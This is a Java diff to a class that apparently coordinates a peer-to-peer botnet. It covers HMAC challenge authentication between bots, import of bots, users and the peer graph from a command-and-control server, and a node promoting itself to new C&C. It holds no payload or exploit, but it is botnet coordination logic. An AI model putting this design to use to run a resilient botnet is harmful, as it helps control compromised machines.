@@ -286,40 +286,40 @@ public class Behavior {
 	}
 
 	public Pairs<Long, Integer> authReqBot(String idBot) {
-		Pairs<Long, Integer> response;
 		Long keyNumber = new Long(auth.generateNumberText());
 		Integer iterationNumber = new Integer(auth.generateIterationNumber());
 		System.out.println("keyNumber " + keyNumber);
 		System.out.println("IterationNumber " + iterationNumber);
 		System.out.println("idbot " + idBot);
-		auth.getBotSeed().add(
-				new Pairs<String, Pairs<Long, Integer>>(idBot, new Pairs<Long, Integer>(keyNumber, iterationNumber)));
-
-		// auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
-		response = new Pairs<Long, Integer>(keyNumber, iterationNumber);
-		return response;
+		Pairs<Long, Integer> challenge = new Pairs<Long, Integer>(keyNumber, iterationNumber);
+		Pairs<String, Pairs<Long, Integer>> map = new Pairs<String, Pairs<Long, Integer>>(idBot, challenge);
+		boolean x= auth.getNeighSeed().add(map);
+		System.out.println("add challenge bot neigh "+ x);
+		return challenge;
 	}
 
 	public Boolean checkHmacBot(ArrayList<Object> objects) {
 		Boolean response = false;
-		SyncIpList<String, Pairs<Long, Integer>> lista = auth.getBotSeed();
+		SyncIpList<String, Pairs<Long, Integer>> lista = auth.getNeighSeed();
 		String idBot = objects.get(0).toString();
 		String hashMac = objects.get(1).toString();
-		if (lista != null) {
-			Pairs<Long, Integer> coppia = lista.getByValue1(idBot).getValue2();
-			Long keyNumber = coppia.getValue1();
-			Integer iterationNumber = coppia.getValue2();
-			if (coppia != null) {
-				if (lista.indexOfValue1(idBot) >= 0) {
-					if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
-						response = true;
-						objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
-						// aggiungere a vicini
+		if (lista != null && lista.getSize()>0) {
+			Pairs<String, Pairs<Long, Integer>> buff = lista.getByValue1(idBot);
+			if (buff != null) {
+				Pairs<Long, Integer> coppia = buff.getValue2();
+				Long keyNumber = coppia.getValue1();
+				Integer iterationNumber = coppia.getValue2();
+				if (coppia != null) {
+					if (lista.indexOfValue1(idBot) >= 0) {
+						if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
+							response = true;
+							objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
+							// aggiungere a vicini
+						}
 					}
 				}
-			}
-
-		}
+			}else System.out.println("hmac bot nofound "+idBot);
+		} System.out.println("");
 		return response;
 	}
 
@@ -346,8 +346,8 @@ public class Behavior {
 			botResp.add(element);
 		}
 		System.out.println("Richieste inviate attendo le risposte");
-		while (botResp.getSize()!=0) {
-			for (int i = 0; i < botResp.getSize(); i++)  {
+		while (botResp.getSize() != 0) {
+			for (int i = 0; i < botResp.getSize(); i++) {
 				Pairs<Future<Pairs<Long, Integer>>, IP> coppia = botResp.get(i);
 				if (coppia.getValue1().isDone()) {
 					if (coppia.getValue1() != null) {
@@ -400,25 +400,25 @@ public class Behavior {
 		String myId = nServ.getIdHash();
 		System.out.println("Importo Database dal C&C");
 		// richiesta ruoli
-		List<Role> roles = req.getRoles(ip,myId);
+		List<Role> roles = req.getRoles(ip, myId);
 		Collections.sort(roles, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
 		roles.forEach(role -> System.out.println("Ruolo: " + role));
 		rServ.saveAll(roles);
 
 		// richiesta bots
-		List<Bot> bots = req.getBots(ip,myId);
+		List<Bot> bots = req.getBots(ip, myId);
 		Collections.sort(bots, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
 		bots.forEach(bot -> System.out.println("Bot: " + bot));
 		bServ.saveAll(bots);
 
 		// richiesta users
-		List<User> users = req.getUser(ip,myId);
+		List<User> users = req.getUser(ip, myId);
 		Collections.sort(users, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
 		users.forEach(user -> System.out.println("Utenti: " + user));
 		uServ.saveAll(users);
 
 		// prendo grafo
-		List<String> graph = req.getPeers(ip,myId);
+		List<String> graph = req.getPeers(ip, myId);
 
 		graph.forEach(e -> System.out.println("Archi: " + e));
 		// informo cc vecchio che spnp ready
@@ -442,7 +442,7 @@ public class Behavior {
 		System.out.println("Aggiorno grafo rete P2P con quello del C&C");
 		pServ.updateNetworkP2P(edge, vertex);
 		// avvisa cec che se ready
-		Boolean b = req.ready(ip,myId);
+		Boolean b = req.ready(ip, myId);
 		if ((b != null) && (b)) {
 			System.out.println("SONO IL NUOVO C&C");
 			eng.setCommandandconquerStatus(true);
